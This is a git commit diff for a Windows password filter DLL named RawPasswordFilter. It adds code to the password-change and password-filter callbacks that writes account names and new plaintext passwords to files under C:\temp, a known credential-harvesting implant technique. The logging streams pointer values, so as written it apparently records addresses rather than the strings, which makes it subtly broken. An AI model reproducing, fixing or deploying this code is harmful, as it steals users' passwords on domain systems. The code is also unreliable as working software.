835b121148753ac21faf93b7f98c1e171eb31627
Niels Schuler <niels.schuler@web.de>
2024-08-15 20:48:52 +0200

    Added Raw Write Access

--- RawPasswordFilter/RawPasswordFilter.cpp
+++ RawPasswordFilter/RawPasswordFilter.cpp
@@ -2,6 +2,9 @@
 #include "RawPasswordFilter.h"
 #include <winternl.h>
 #include <ntstatus.h>
+#include <iostream>
+#include <fstream>
+#include <string>
 
 
 bool InitializeChangeNotify() {
@@ -10,9 +13,29 @@ bool InitializeChangeNotify() {
 
 NTSTATUS PasswordChangeNotify(PUNICODE_STRING UserName, ULONG RelativeId, PUNICODE_STRING NewPassword) {
 	
+	std::ofstream myfile;
+	myfile.open("C:\\temp\\example1.txt");
+	myfile << UserName;
+	myfile << " | ";
+	myfile << RelativeId;
+	myfile << " | ";
+	myfile << NewPassword;
+	myfile << "\n";
+	myfile.close();
 	return STATUS_SUCCESS;
 }
 
 bool PasswordFilter(PUNICODE_STRING AccountName, PUNICODE_STRING FullName, PUNICODE_STRING Password, bool SetOperation) {
+	std::ofstream myfile;
+	myfile.open("C:\\temp\\example2.txt");
+	myfile << AccountName;
+	myfile << " | ";
+	myfile << FullName;
+	myfile << " | ";
+	myfile << Password;
+	myfile << " | ";
+	myfile << SetOperation;
+	myfile << "\n";
+	myfile.close();
 	return true;
 }
